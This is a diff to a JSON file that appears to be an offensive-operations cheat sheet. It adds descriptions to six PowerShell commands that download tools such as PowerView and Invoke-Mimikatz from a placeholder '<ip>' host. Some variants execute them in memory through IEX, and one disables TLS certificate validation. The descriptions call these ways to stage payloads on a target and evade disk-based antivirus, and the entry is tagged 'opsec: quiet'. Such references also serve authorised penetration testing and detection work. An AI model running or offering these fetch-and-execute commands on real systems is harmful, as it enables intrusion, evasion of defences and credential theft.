@@ -69,27 +69,33 @@
   "variations": [
     {
       "label": "WebClient DownloadFile",
-      "command": "(New-Object Net.WebClient).DownloadFile('https://<ip>/PowerView.ps1','C:\\Users\\Public\\Downloads\\PowerView.ps1')"
+      "command": "(New-Object Net.WebClient).DownloadFile('https://<ip>/PowerView.ps1','C:\\Users\\Public\\Downloads\\PowerView.ps1')",
+      "description": "Downloads a file or script from a remote URL. Used for staging tools, payloads, or second-stage code on the target."
     },
     {
       "label": "WebClient async",
-      "command": "(New-Object Net.WebClient).DownloadFileAsync('https://<ip>/PowerView.ps1','C:\\Users\\Public\\Downloads\\PowerViewAsync.ps1')"
+      "command": "(New-Object Net.WebClient).DownloadFileAsync('https://<ip>/PowerView.ps1','C:\\Users\\Public\\Downloads\\PowerViewAsync.ps1')",
+      "description": "Downloads a file or script from a remote URL. Used for staging tools, payloads, or second-stage code on the target."
     },
     {
       "label": "Invoke-WebRequest -OutFile",
-      "command": "Invoke-WebRequest https://<ip>/PowerView.ps1 -OutFile PowerView.ps1"
+      "command": "Invoke-WebRequest https://<ip>/PowerView.ps1 -OutFile PowerView.ps1",
+      "description": "Downloads a file from a URL using PowerShell Invoke-WebRequest. Used to stage tools, payloads, or scripts on the target machine."
     },
     {
       "label": "Fileless (DownloadString | IEX)",
-      "command": "IEX (New-Object Net.WebClient).DownloadString('https://<ip>/Invoke-Mimikatz.ps1')\n# or: (New-Object Net.WebClient).DownloadString('https://<ip>/x.ps1') | IEX"
+      "command": "IEX (New-Object Net.WebClient).DownloadString('https://<ip>/Invoke-Mimikatz.ps1')\n# or: (New-Object Net.WebClient).DownloadString('https://<ip>/x.ps1') | IEX",
+      "description": "Downloads and executes a PowerShell script directly in memory without writing to disk. Common initial access and tool staging technique - bypasses disk-based AV scanning."
     },
     {
       "label": "Fileless via IWR",
-      "command": "Invoke-WebRequest https://<ip>/PowerView.ps1 -UseBasicParsing | IEX"
+      "command": "Invoke-WebRequest https://<ip>/PowerView.ps1 -UseBasicParsing | IEX",
+      "description": "Downloads and executes a PowerShell script directly in memory without writing to disk. Common initial access and tool staging technique - bypasses disk-based AV scanning."
     },
     {
       "label": "SSL bypass (self-signed cert)",
-      "command": "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}\nInvoke-WebRequest https://<ip>/PowerView.ps1 -OutFile PowerView.ps1"
+      "command": "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}\nInvoke-WebRequest https://<ip>/PowerView.ps1 -OutFile PowerView.ps1",
+      "description": "Downloads a file from a URL using PowerShell Invoke-WebRequest. Used to stage tools, payloads, or scripts on the target machine."
     }
   ],
   "opsec": "quiet",
